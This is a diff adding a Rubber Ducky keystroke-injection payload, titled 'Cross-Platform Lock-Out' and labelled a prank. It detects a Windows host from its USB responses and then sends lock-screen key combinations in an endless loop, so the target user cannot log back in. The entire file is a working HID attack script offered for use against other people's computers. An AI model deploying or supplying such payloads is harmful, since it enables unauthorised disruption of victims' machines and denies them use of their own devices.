@@ -1,0 +1,60 @@
+REM # Title: Cross-Platform Lock-Out, Rubber Ducky Edition
+REM # Authors: dk, JAKE_EGGMC
+REM # Description: Annoying advanced keystroke injection code to refuse re-logging into PC, unless edited
+REM # Target: Windows User, unless editied
+REM # Demo: Reference to HaK5 episode 2503
+REM # Category: Prank
+REM #
+REM #
+REM #
+
+REM # LEDS & Attackmode
+LED_R
+ATTACKMODE HID
+LED_G
+
+
+REM # OS Detection to ensure the target is a Windows PC [Change here for other platforms]
+EXTENSION PASSIVE_WINDOWS_DETECT
+
+    REM # CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+IF ($_OS != WINDOWS)                                                                                                                 
+    LED_R                                                                                                                                       
+    STOP_PAYLOAD 
+END_IF
+
+
+REM # Endless Windows lock-out prank, unless edited for Mac or Linux. See above.
+WHILE TRUE
+    GUI l
+    KEYCODE 02,00,4a
+    BACKSPACE
+    
+    CTRL-ALT l
+    BACKSPACE
+
+    COMMAND-CTRL-q
+    BACKSPACE
+END_WHILE
+
+
+
+
+    
